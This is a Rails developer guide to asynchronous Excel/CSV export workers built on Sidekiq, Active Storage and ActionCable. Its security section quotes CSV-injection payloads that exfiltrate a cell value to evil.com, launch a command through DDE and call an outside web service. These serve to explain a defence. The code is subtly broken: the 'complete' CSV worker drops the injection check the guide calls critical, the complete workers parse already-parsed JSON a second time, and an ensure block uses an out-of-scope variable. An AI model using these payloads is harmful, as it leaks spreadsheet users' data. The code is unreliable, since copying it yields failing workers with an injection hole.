# Exportation Feature Documentation

This document provides a comprehensive guide to implementing an exportation feature similar to the one used in this Rails application. The exportation system allows users to export data to Excel (XLSX) or CSV files asynchronously using background workers.

## Table of Contents

1. [Architecture Overview](#architecture-overview)
2. [Database Model](#database-model)
3. [Worker Pattern](#worker-pattern)
4. [Controller Integration](#controller-integration)
5. [File Format Support](#file-format-support)
6. [Real-time Notifications](#real-time-notifications)
7. [Error Handling](#error-handling)
8. [Best Practices](#best-practices)
9. [Code Examples](#code-examples)

---

## Architecture Overview

The exportation feature follows this flow:

```
User Request → Controller → Background Worker → File Generation → Storage → Notification
```

**Key Components:**

- **Model**: `Exportation` - Stores metadata about exports
- **Workers**: Sidekiq workers that process exports asynchronously
- **Storage**: Active Storage for file attachments
- **Notifications**: ActionCable for real-time updates

---

## Database Model

### Exportation Model

```ruby
class Exportation < ApplicationRecord
  belongs_to :user, optional: true
  has_one_attached :file
  jsonb_accessor :filter_params,
    query: :string

  # Status enum
  enum status: {
    pending: 0,
    processing: 1,
    finished: 2,
    failed: 3
  }

  # File format enum
  enum file_format: {
    xlsx: 0,
    csv: 1
  }

  # Scopes
  scope :recent, -> { order(created_at: :desc) }
  scope :for_user, ->(user) { where(user: user) }

  # Search functionality
  def self.search(query)
    return all.order("created_at desc").includes(:file_attachment) if query.blank?
    build_where_query(all, query).order("created_at desc").includes(:file_attachment)
  end

  def mark_as_processing!
    update!(status: :processing)
  end

  def mark_as_finished!
    update!(status: :finished, finished_at: Time.current)
  end

  def mark_as_failed!(error_message)
    update!(status: :failed, error_message: error_message, finished_at: Time.current)
  end
end
```

### Migration

```ruby
class CreateExportation < ActiveRecord::Migration[7.2]
  def change
    create_table :exportations do |t|
      t.jsonb :filter_params
      t.references :user, null: true, foreign_key: true  # optional: true
      t.integer :status, default: 0, null: false  # enum: pending, processing, finished, failed
      t.integer :file_format, default: 0, null: false  # enum: xlsx, csv
      t.text :error_message
      t.datetime :finished_at
      t.timestamps
    end

    add_index :exportations, :status
    add_index :exportations, :user_id
    add_index :exportations, :created_at
  end
end
```

**Key Fields:**

- `user_id`: The user who requested the export (optional)
- `filter_params`: JSONB field storing filter/search parameters
- `file`: Active Storage attachment for the generated file
- `status`: Enum tracking export lifecycle (pending → processing → finished/failed)
- `file_format`: Enum indicating file type (xlsx or csv)
- `error_message`: Stores error details if export fails
- `finished_at`: Timestamp when export completed (success or failure)

---

## Worker Pattern

### Base Structure

All exportation workers follow a consistent pattern:

1. **Include Sidekiq::Worker**
2. **Create Exportation record** with `pending` status (early creation)
3. **Parse parameters** (user_id, filter_params)
4. **Mark exportation as `processing`**
5. **Query data** based on filters (using batching for large datasets)
6. **Generate file** (Excel or CSV) in `tmp/` directory
7. **Attach file** to Exportation record
8. **Mark exportation as `finished`**
9. **Clean up temporary files**
10. **Notify user** via ActionCable with rich payload
11. **Handle errors** by marking as `failed` with error message

### Excel Export Worker Template

```ruby
require "fast_excel"

class ExportationResourceWorker
  include Sidekiq::Worker
  sidekiq_options retry: false

  def perform(user_id, filter_params)
    start_time = Time.current
    user = User.find_by(id: user_id)
    return unless user

    # Create exportation record early
    exportation = Exportation.create!(
      user: user,
      status: :pending,
      file_format: :xlsx,
      filter_params: { description: "Export description" }
    )

    Rails.logger.info "[Exportation##{exportation.id}] Started export for user##{user_id}"

    begin
      filter_params = parse_filter_params(filter_params)
      unless filter_params
        exportation.mark_as_failed!("Invalid filter parameters")
        notify_user(user_id, exportation, :failed, "Paramètres de filtrage invalides")
        return
      end

      # Mark as processing
      exportation.mark_as_processing!

      # Query data (use batching for large datasets)
      resources = ResourceModel.search(filter_params)
                              .includes(:associations)
                              .order(:created_at)

      if resources.empty?
        exportation.mark_as_failed!("No data found")
        notify_user(user_id, exportation, :failed, "Aucune donnée trouvée")
        return
      end

      records_count = resources.count
      Rails.logger.info "[Exportation##{exportation.id}] Processing #{records_count} records"

      # Generate file in tmp/ (secure location)
      file_name = generate_file_name
      generate_excel_file(file_name, resources, exportation)

      # Attach file
      exportation.file.attach(
        io: File.open(file_name),
        filename: "export_#{Time.current.to_i}.xlsx"
      )

      # Mark as finished
      exportation.mark_as_finished!

      duration = Time.current - start_time
      Rails.logger.info "[Exportation##{exportation.id}] Completed in #{duration.round(2)}s (#{records_count} records)"

      # Cleanup
      delete_file(file_name)

      # Notify user
      notify_user(user_id, exportation, :finished, "Export terminé avec succès")
    rescue StandardError => e
      handle_error(e, exportation, user_id)
    end
  end

  private

  def parse_filter_params(params)
    JSON.parse(params).transform_keys(&:to_sym)
  rescue JSON::ParserError
    Rails.logger.error "Erreur de parsing des filtres d'exportation"
    nil
  end

  def generate_file_name
    # Always use tmp/ for security (files not accessible via URL)
    Rails.root.join("tmp", "export_#{Time.current.to_i}.xlsx")
  end

  def generate_excel_file(file_name, resources, exportation)
    workbook = FastExcel.open(file_name.to_s, constant_memory: true)
    worksheet = workbook.add_worksheet("Sheet Name")

    # Add headers
    headers = ["Column 1", "Column 2", "Column 3"]
    worksheet.append_row(headers)

    # Use batching for large datasets to avoid memory issues
    batch_size = 1000
    processed = 0

    resources.in_batches(of: batch_size) do |batch|
      batch.each do |resource|
        worksheet.append_row([
          resource.field1,
          resource.field2,
          format_date(resource.created_at)
        ])
        processed += 1
      end

      # Log progress for large exports
      if processed % 5000 == 0
        Rails.logger.info "[Exportation##{exportation.id}] Processed #{processed} rows"
      end
    end

    workbook.close
  end

  def delete_file(file_name)
    return unless File.exist?(file_name)
    File.delete(file_name)
  rescue StandardError => e
    Rails.logger.warn "Erreur lors de la suppression: #{e.message}"
  end

  def notify_user(user_id, exportation, status, message)
    ActionCable.server.broadcast(
      "exportations_#{user_id}",
      {
        exportation_id: exportation.id,
        status: status,
        message: message,
        redirect: Rails.application.routes.url_helpers.exportations_path
      }
    )
  end

  def handle_error(error, exportation, user_id)
    error_message = "#{error.class}: #{error.message}"
    Rails.logger.error "[Exportation##{exportation.id}] Error: #{error_message}"
    Rails.logger.error "[Exportation##{exportation.id}] Backtrace: #{error.backtrace.join("\n")}"

    exportation.mark_as_failed!(error_message)
    notify_user(user_id, exportation, :failed, "Erreur lors de l'exportation: #{error.message}")
  end

  def format_date(date)
    date&.strftime("%d/%m/%Y %H:%M:%S") || "N/A"
  end
end
```

### CSV Export Worker Template

```ruby
require "csv"

class ExportationResourceCsvWorker
  include Sidekiq::Worker
  sidekiq_options retry: false

  def perform(user_id, filter_params)
    user = User.find_by(id: user_id)
    return unless user

    filter_params = parse_filter_params(filter_params)
    return unless filter_params

    resources = ResourceModel.search(filter_params)
                            .includes(:associations)
                            .order(:created_at)

    return if resources.empty?

    # Use tmp/ for security (not accessible via URL)
    file_name = Rails.root.join("tmp", "export_#{Time.current.to_i}.csv")

    # Create exportation record early
    exportation = Exportation.create!(
      user: user,
      status: :pending,
      file_format: :csv,
      filter_params: { description: "Export description" }
    )

    begin
      exportation.mark_as_processing!

      records_count = resources.count
      Rails.logger.info "[Exportation##{exportation.id}] Processing #{records_count} records"

      CSV.open(file_name, "w", encoding: "UTF-8") do |csv|
        # Add BOM for Excel compatibility
        csv << ["\uFEFFColumn 1", "Column 2", "Column 3"]

        # Use batching for large datasets
        resources.in_batches(of: 1000) do |batch|
          batch.each do |resource|
            csv << [
              sanitize_cell(resource.field1),
              sanitize_cell(resource.field2),
              format_date(resource.created_at)
            ]
          end
        end
      end

      exportation.file.attach(
        io: File.open(file_name),
        filename: "export_#{Time.current.to_i}.csv",
        content_type: "text/csv; charset=utf-8"
      )

      exportation.mark_as_finished!
      delete_file(file_name)
      notify_user(user_id, exportation, :finished, "Export terminé avec succès")
    rescue StandardError => e
      handle_error(e, exportation, user_id)
    end
  end

  private

  def sanitize_cell(cell)
    value = cell.to_s.encode("UTF-8", invalid: :replace, undef: :replace, replace: "")

    # CSV Injection protection: prefix dangerous characters with apostrophe
    if value.start_with?("=", "+", "-", "@", "\t", "\r")
      value = "'#{value}"
    end

    value
  end

  # ... other private methods same as Excel worker
end
```

### Key Differences: Excel vs CSV

| Feature               | Excel (FastExcel)                       | CSV (Ruby CSV)                          |
| --------------------- | --------------------------------------- | --------------------------------------- |
| **Library**           | `fast_excel` gem                        | Built-in `csv`                          |
| **Memory**            | `constant_memory: true` for large files | Streams naturally                       |
| **File Location**     | `tmp/` (secure, not URL-accessible)     | `tmp/` (secure, not URL-accessible)     |
| **Encoding**          | Automatic                               | UTF-8 with BOM for Excel                |
| **Cell Sanitization** | Not needed (handled by library)         | **Required** - CSV Injection protection |
| **Formatting**        | Supports formatting                     | Plain text only                         |
| **Security**          | Safe                                    | **Must sanitize** =, +, -, @, \t, \r    |

---

## Controller Integration

### Basic Controller Pattern

```ruby
class ResourcesController < ApplicationController
  def exportation
    ExportationResourceWorker.perform_async(
      current_user.id,
      filter_params.to_json
    )

    redirect_to exportations_path, notice: "Exportation en cours."
  end

  private

  def filter_params
    filter = params.fetch(:filter, {})
                  .permit(:query, :created_from, :created_to)
                  .to_h
    filter
  end
end
```

### With Additional Parameters

```ruby
def exportation
  resource_id = params[:id]
  ExportationResourceWorker.perform_async(
    resource_id,
    current_user.id
  )

  redirect_to exportations_path, notice: "Exportation en cours."
end
```

---

## File Format Support

### Excel (XLSX) with FastExcel

**Gem Required:**

```ruby
gem 'fast_excel'
```

**Features:**

- Memory-efficient with `constant_memory: true`
- Multiple worksheets support
- Fast generation for large datasets

**Example:**

```ruby
workbook = FastExcel.open(file_name, constant_memory: true)
worksheet = workbook.add_worksheet("Data")
worksheet.append_row(["Header 1", "Header 2"])
worksheet.append_row(["Value 1", "Value 2"])
workbook.close
```

### CSV with Ruby CSV

**Built-in Library:**

```ruby
require "csv"
```

**Features:**

- UTF-8 encoding with BOM for Excel compatibility
- Cell sanitization for special characters
- Streaming support for large files

**Example:**

```ruby
CSV.open(file_name, "w", encoding: "UTF-8") do |csv|
  csv << ["\uFEFFHeader 1", "Header 2"]  # BOM for Excel
  csv << [value1, value2]
end
```

---

## Security Considerations

### CSV Injection Protection

**⚠️ CRITICAL: CSV Injection is a serious security vulnerability**

When Excel opens a CSV file, cells starting with `=`, `+`, `-`, `@`, `\t`, or `\r` are interpreted as formulas. Malicious users can inject formulas that:

- Exfiltrate data: `=HYPERLINK("http://evil.com/steal?cookie="&A1,"Click me")`
- Execute commands: `=cmd|'/c calc'!A0`
- Access external resources: `=WEBSERVICE("http://evil.com")`

**Solution: Always sanitize CSV cells**

```ruby
def sanitize_cell(cell)
  value = cell.to_s.encode("UTF-8", invalid: :replace, undef: :replace, replace: "")

  # CSV Injection protection: prefix dangerous characters with apostrophe
  # Excel will treat it as text, not a formula
  if value.start_with?("=", "+", "-", "@", "\t", "\r")
    value = "'#{value}"
  end

  value
end
```

**Example:**

```ruby
# Before sanitization (DANGEROUS)
csv << ["=HYPERLINK(\"http://evil.com\")", "Normal text"]

# After sanitization (SAFE)
csv << ["'=HYPERLINK(\"http://evil.com\")", "Normal text"]
```

**Note:** Excel files (XLSX) are not vulnerable to this attack as they don't interpret formulas from cell content automatically.

### File Storage Security

**Never store sensitive exports in `public/` directory:**

```ruby
# ✅ SECURE: Use tmp/ directory
file_name = Rails.root.join("tmp", "export_#{Time.current.to_i}.xlsx")

# ❌ INSECURE: Don't use public/ for sensitive data
file_name = Rails.public_path.join("export_#{Time.current.to_i}.xlsx")
```

**Why:**

- Files in `public/` can be accessible via URL if server is misconfigured
- `tmp/` is not web-accessible
- ActiveStorage provides signed URLs and access control

---

## Real-time Notifications

### ActionCable Integration

Workers broadcast completion notifications via ActionCable with a rich payload:

```ruby
ActionCable.server.broadcast(
  "exportations_#{user_id}",
  {
    exportation_id: exportation.id,
    status: :finished,  # or :failed
    message: "Export terminé avec succès",
    redirect: Rails.application.routes.url_helpers.exportations_path
  }
)
```

**Payload Structure:**

- `exportation_id`: ID of the Exportation record (for UI updates)
- `status`: Current status (`:pending`, `:processing`, `:finished`, `:failed`)
- `message`: Human-readable message for user feedback
- `redirect`: Optional URL to redirect user (can be nil if just showing toast)

### Frontend Subscription (JavaScript/Stimulus)

```javascript
// app/javascript/channels/exportations_channel.js
import consumer from "./consumer";

consumer.subscriptions.create("ExportationsChannel", {
  connected() {
    console.log("Connected to exportations channel");
  },

  received(data) {
    // Show toast notification
    if (data.status === "finished") {
      showToast("success", data.message || "Export terminé avec succès");
    } else if (data.status === "failed") {
      showToast("error", data.message || "Erreur lors de l'exportation");
    }

    // Update UI if exportation list is visible
    if (data.exportation_id) {
      updateExportationRow(data.exportation_id, data.status);
    }

    // Optional redirect
    if (data.redirect) {
      setTimeout(() => {
        window.location.href = data.redirect;
      }, 2000); // Delay to show toast first
    }
  },
});
```

### Channel Definition

```ruby
# app/channels/exportations_channel.rb
class ExportationsChannel < ApplicationCable::Channel
  def subscribed
    stream_from "exportations_#{current_user.id}"
  end
end
```

---

## Error Handling

### Standard Error Handling Pattern

```ruby
rescue StandardError => e
  error_message = "#{e.class}: #{e.message}"
  Rails.logger.error "[Exportation##{exportation.id}] Error: #{error_message}"
  Rails.logger.error "[Exportation##{exportation.id}] Backtrace: #{e.backtrace.join("\n")}"

  # Mark exportation as failed
  exportation.mark_as_failed!(error_message)

  # Notify user
  notify_user(user_id, exportation, :failed, "Erreur: #{e.message}")
ensure
  # Cleanup temporary files
  File.delete(file_name) if file_name && File.exist?(file_name)
end
```

### Best Practices

1. **Early Exportation Creation**: Create Exportation record at start with `pending` status
2. **Status Tracking**: Update status throughout lifecycle (pending → processing → finished/failed)
3. **Early Returns**: Check for user and valid params early, mark as failed if invalid
4. **Empty Data Handling**: Mark as failed with descriptive message if no data found
5. **File Cleanup**: Always delete temporary files in `ensure` block
6. **Structured Logging**: Include exportation ID, record counts, and duration in logs
7. **User Feedback**: Notify user on both success and failure with rich payload
8. **Error Messages**: Store detailed error messages in `error_message` field

---

## Best Practices

### 1. Memory Management

**For Large Datasets:**

- Use `constant_memory: true` with FastExcel
- Stream CSV files instead of loading all data
- **Always use `in_batches` or `find_each` for large queries** (critical for scalability)

```ruby
# ✅ CORRECT: Use batching for large datasets
resources.in_batches(of: 1000) do |batch|
  batch.each do |resource|
    worksheet.append_row([...])
  end
end

# OR with find_each (if you don't need ordering)
ResourceModel.find_each(batch_size: 1000) do |resource|
  worksheet.append_row([...])
end

# ❌ WRONG: Don't use .each on large datasets
resources.each do |resource|  # Loads all records in memory!
  worksheet.append_row([...])
end
```

**Why batching matters:**

- Prevents memory exhaustion with large datasets (200k+ records)
- Allows progress logging during long exports
- Better error recovery (can resume from last batch)

### 2. File Security & Storage

**⚠️ CRITICAL: Never use `Rails.public_path` for sensitive exports**

Files in `public/` can be accessible via URL if server is misconfigured. Always use `tmp/`:

```ruby
# ✅ SECURE: Use tmp/ directory
file_name = Rails.root.join("tmp", "export_#{Time.current.to_i}.xlsx")

# ❌ INSECURE: Don't use public/ for sensitive data
file_name = Rails.public_path.join("export_#{Time.current.to_i}.xlsx")  # DANGEROUS!
```

**File Naming Pattern:**

```ruby
"ResourceType_#{Time.current.to_i}.xlsx"
# Example: "ClientTopups_1704067200.xlsx"
```

**File Access:**

- Files in `tmp/` are not accessible via URL
- Serve files through ActiveStorage (signed URLs, permissions)
- ActiveStorage handles security and access control

### 3. CSV Injection Protection

**⚠️ CRITICAL SECURITY: Protect against CSV Injection**

If a CSV cell starts with `=`, `+`, `-`, `@`, `\t`, or `\r`, Excel will interpret it as a formula. This is a security vulnerability (CSV Injection attack).

**Always sanitize CSV cells:**

```ruby
def sanitize_cell(cell)
  value = cell.to_s.encode("UTF-8", invalid: :replace, undef: :replace, replace: "")

  # CSV Injection protection: prefix dangerous characters with apostrophe
  if value.start_with?("=", "+", "-", "@", "\t", "\r")
    value = "'#{value}"
  end

  value
end
```

**Example attack:**

```csv
=HYPERLINK("http://evil.com/steal?cookie="&A1,"Click me")
```

**After sanitization:**

```csv
'=HYPERLINK("http://evil.com/steal?cookie="&A1,"Click me")
```

### 4. Data Formatting

**Common Formatting Helpers:**

```ruby
def format_date(date)
  date&.strftime("%d/%m/%Y %H:%M:%S") || "N/A"
end

def format_currency(amount)
  ActionController::Base.helpers.number_to_currency(
    amount,
    unit: "F CFA",
    separator: "",
    delimiter: " ",
    format: "%n %u",
    precision: 0
  )
end

def format_phone(number)
  number.to_s.gsub(/(\d{2})(?=\d)/, '\1 ').strip
end
```

### 5. Query Optimization

**Use Includes to Prevent N+1:**

```ruby
resources = ResourceModel.search(filter_params)
                        .includes(:association1, :association2)
                        .order(:created_at)
```

**Use Decorators for Display Logic:**

```ruby
resources = ResourceModel.search(filter_params)
                        .includes(:associations)
                        .decorate  # Using Draper or similar
```

### 6. Observability & Logging

**Structured Logging Pattern:**

```ruby
# Start of export
Rails.logger.info "[Exportation##{exportation.id}] Started export for user##{user_id}"

# Progress tracking
Rails.logger.info "[Exportation##{exportation.id}] Processing #{records_count} records"
Rails.logger.info "[Exportation##{exportation.id}] Processed #{processed} rows"  # During batching

# Completion
duration = Time.current - start_time
Rails.logger.info "[Exportation##{exportation.id}] Completed in #{duration.round(2)}s (#{records_count} records)"

# Errors
Rails.logger.error "[Exportation##{exportation.id}] Error: #{error_message}"
Rails.logger.error "[Exportation##{exportation.id}] Backtrace: #{error.backtrace.join("\n")}"
```

**Metrics to Track:**

- Exportation ID (for correlation)
- User ID
- Record count
- File format
- Duration (start/end time)
- Status changes
- Error messages

**Sidekiq Request ID (Optional):**

```ruby
# In initializer or worker
def perform(user_id, filter_params)
  request_id = SecureRandom.uuid
  Rails.logger.info "[RequestID:#{request_id}] Starting export for user##{user_id}"
  # ... rest of code
end
```

### 7. Sidekiq Configuration

**Retry Settings:**

```ruby
sidekiq_options retry: false  # For exports, usually no retry needed
# OR
sidekiq_options retry: 3, backtrace: true  # If retries are desired
```

---

## Code Examples

### Complete Excel Export Worker

```ruby
require "fast_excel"

class ExportationClientTopupWorker
  include Sidekiq::Worker
  sidekiq_options retry: false

  def perform(user_id, filter_params)
    user = User.find_by(id: user_id)
    return unless user

    filter_params = parse_filter_params(filter_params)
    return unless filter_params

    start_time = Time.current

    # Create exportation record early
    exportation = Exportation.create!(
      user: user,
      status: :pending,
      file_format: :xlsx,
      filter_params: { description: "Liste des paiements" }
    )

    Rails.logger.info "[Exportation##{exportation.id}] Started export for user##{user_id}"

    begin
      filter_params = parse_filter_params(filter_params)
      unless filter_params
        exportation.mark_as_failed!("Invalid filter parameters")
        notify_user(user_id, exportation, :failed, "Paramètres invalides")
        return
      end

      exportation.mark_as_processing!

      client_topups = ClientTopup.search(filter_params)
                                 .includes(:client_wallet, :tresor_category)
                                 .order(:validated_at)
                                 .decorate

      if client_topups.blank?
        exportation.mark_as_failed!("No data found")
        notify_user(user_id, exportation, :failed, "Aucune donnée trouvée")
        return
      end

      records_count = client_topups.count
      Rails.logger.info "[Exportation##{exportation.id}] Processing #{records_count} records"

      file_name = Rails.root.join("tmp", "ClientTopups_#{Time.current.to_i}.xlsx")

      workbook = FastExcel.open(file_name.to_s, constant_memory: true)
      worksheet = workbook.add_worksheet

      headers = [
        "Nom et prénom", "Service", "Montant", "Référence",
        "Statut", "Date de création", "Date de paiement"
      ]
      worksheet.append_row(headers)

      # Use batching for large datasets
      processed = 0
      client_topups.in_batches(of: 1000) do |batch|
        batch.each do |topup|
          worksheet.append_row([
            "#{topup.first_name} #{topup.last_name}",
            topup.displayed_tresor_category,
            topup.displayed_amount,
            topup.reference,
            "Succès",
            format_date(topup.created_at),
            format_date(topup.validated_at)
          ])
          processed += 1
        end

        if processed % 5000 == 0
          Rails.logger.info "[Exportation##{exportation.id}] Processed #{processed} rows"
        end
      end

      workbook.close

      exportation.file.attach(
        io: File.open(file_name),
        filename: "ClientTopups_#{Time.current.to_i}.xlsx"
      )

      exportation.mark_as_finished!

      duration = Time.current - start_time
      Rails.logger.info "[Exportation##{exportation.id}] Completed in #{duration.round(2)}s (#{records_count} records)"

      delete_file(file_name)
      notify_user(user_id, exportation, :finished, "Export terminé avec succès")
    rescue StandardError => e
      handle_error(e, exportation, user_id)
    end
  end

  private

  def parse_filter_params(params)
    JSON.parse(params).transform_keys(&:to_sym)
  rescue JSON::ParserError
    Rails.logger.error "Erreur de parsing des filtres"
    nil
  end

  def delete_file(file_name)
    return unless File.exist?(file_name)
    File.delete(file_name)
  rescue StandardError => e
    Rails.logger.warn "Erreur suppression: #{e.message}"
  end

  def notify_user(user_id, exportation, status, message)
    ActionCable.server.broadcast(
      "exportations_#{user_id}",
      {
        exportation_id: exportation.id,
        status: status,
        message: message,
        redirect: Rails.application.routes.url_helpers.exportations_path
      }
    )
  end

  def handle_error(error, exportation, user_id)
    error_message = "#{error.class}: #{error.message}"
    Rails.logger.error "[Exportation##{exportation.id}] Error: #{error_message}"
    Rails.logger.error "[Exportation##{exportation.id}] Backtrace: #{error.backtrace.join("\n")}"

    exportation.mark_as_failed!(error_message)
    notify_user(user_id, exportation, :failed, "Erreur: #{error.message}")
  end

  def format_date(date)
    date&.strftime("%d/%m/%Y %H:%M:%S") || "N/A"
  end
end
```

### Complete CSV Export Worker

```ruby
require "csv"

class ExportationClientTopupCsvWorker
  include Sidekiq::Worker
  sidekiq_options retry: false

  def perform(user_id, filter_params)
    user = User.find_by(id: user_id)
    return unless user

    filter_params = parse_filter_params(filter_params)
    return unless filter_params

    start_time = Time.current

    # Create exportation record early
    exportation = Exportation.create!(
      user: user,
      status: :pending,
      file_format: :csv,
      filter_params: { description: "Liste des paiements" }
    )

    Rails.logger.info "[Exportation##{exportation.id}] Started CSV export for user##{user_id}"

    begin
      filter_params = parse_filter_params(filter_params)
      unless filter_params
        exportation.mark_as_failed!("Invalid filter parameters")
        notify_user(user_id, exportation, :failed, "Paramètres invalides")
        return
      end

      exportation.mark_as_processing!

      client_topups = ClientTopup.search(filter_params)
                                 .includes(:client_wallet, :tresor_category)
                                 .order(:validated_at)
                                 .decorate

      if client_topups.blank?
        exportation.mark_as_failed!("No data found")
        notify_user(user_id, exportation, :failed, "Aucune donnée trouvée")
        return
      end

      records_count = client_topups.count
      Rails.logger.info "[Exportation##{exportation.id}] Processing #{records_count} records"

      file_name = Rails.root.join("tmp", "ClientTopups_#{Time.current.to_i}.csv")

      CSV.open(file_name, "w", encoding: "UTF-8") do |csv|
        csv << ["\uFEFFNom et prénom", "Service", "Montant", "Référence",
                "Statut", "Date de création", "Date de paiement"]

        # Use batching for large datasets
        client_topups.in_batches(of: 1000) do |batch|
          batch.each do |topup|
            csv << [
              sanitize_cell("#{topup.first_name} #{topup.last_name}"),
              sanitize_cell(topup.displayed_tresor_category),
              sanitize_cell(topup.displayed_amount),
              sanitize_cell(topup.reference),
              "Succès",
              format_date(topup.created_at),
              format_date(topup.validated_at)
            ]
          end
        end
      end

      exportation.file.attach(
        io: File.open(file_name),
        filename: "ClientTopups_#{Time.current.to_i}.csv",
        content_type: "text/csv; charset=utf-8"
      )

      exportation.mark_as_finished!

      duration = Time.current - start_time
      Rails.logger.info "[Exportation##{exportation.id}] Completed in #{duration.round(2)}s (#{records_count} records)"

      delete_file(file_name)
      notify_user(user_id, exportation, :finished, "Export terminé avec succès")
    rescue StandardError => e
      handle_error(e, exportation, user_id)
    end
  end

  private

  def sanitize_cell(cell)
    cell.to_s.encode("UTF-8", invalid: :replace, undef: :replace, replace: "")
  end

  # ... other methods same as Excel worker
end
```

---

## Summary Checklist

When implementing an exportation feature:

- [ ] Create `Exportation` model with `user_id` (optional), `status`, `file_format`, `error_message`, `finished_at`
- [ ] Add status enum (pending, processing, finished, failed)
- [ ] Add file_format enum (xlsx, csv)
- [ ] Create worker class inheriting from `Sidekiq::Worker`
- [ ] Create Exportation record early with `pending` status
- [ ] Implement `perform` method with user validation
- [ ] Parse filter parameters safely, mark as failed if invalid
- [ ] Mark exportation as `processing` before data query
- [ ] Query data with proper includes/joins
- [ ] **Use `in_batches` or `find_each` for large datasets** (critical!)
- [ ] Generate file in `tmp/` directory (not `public/`)
- [ ] **Sanitize CSV cells** to prevent CSV Injection (=, +, -, @, \t, \r)
- [ ] Attach file to Exportation record
- [ ] Mark exportation as `finished` on success
- [ ] Mark exportation as `failed` with error message on error
- [ ] Clean up temporary files in `ensure` block
- [ ] Broadcast rich notification via ActionCable (exportation_id, status, message)
- [ ] Add structured logging with exportation ID, record counts, duration
- [ ] Create controller action to trigger worker
- [ ] Set up ActionCable channel for real-time updates
- [ ] Test with various data sizes (including 200k+ records)
- [ ] Test error scenarios
- [ ] Test CSV Injection protection

---

## Dependencies

**Required Gems:**

```ruby
gem 'sidekiq'           # Background jobs
gem 'fast_excel'        # Excel generation (optional, for XLSX)
gem 'active_storage'    # File attachments (Rails built-in)
gem 'actioncable'       # Real-time notifications (Rails built-in)
```

**Optional:**

```ruby
gem 'draper'            # Decorators for display logic
gem 'pagy'              # Pagination (if needed)
```

---

## Notes

### Security

- **File Storage**: ⚠️ **Always use `tmp/` for sensitive exports** - files in `public/` can be accessible via URL
- **CSV Injection**: Always sanitize CSV cells starting with `=`, `+`, `-`, `@`, `\t`, `\r`
- **Permissions**: Validate user permissions before allowing exports
- **ActiveStorage**: Serve files through ActiveStorage (signed URLs, access control)

### Performance

- **Batching**: **Always use `in_batches` or `find_each`** for large datasets (200k+ records)
- **Memory**: Use `constant_memory: true` for large Excel files
- **Progress Logging**: Log progress every 5000 records for long-running exports

### Observability

- **Structured Logging**: Include exportation ID in all log messages
- **Metrics**: Track record counts, duration, file format, status changes
- **Error Tracking**: Store detailed error messages in `error_message` field

### Data Quality

- **Encoding**: Always use UTF-8 for CSV files, with BOM for Excel compatibility
- **Status Tracking**: Create exportation early, track status throughout lifecycle
- **User Feedback**: Send rich notifications with exportation_id, status, and message
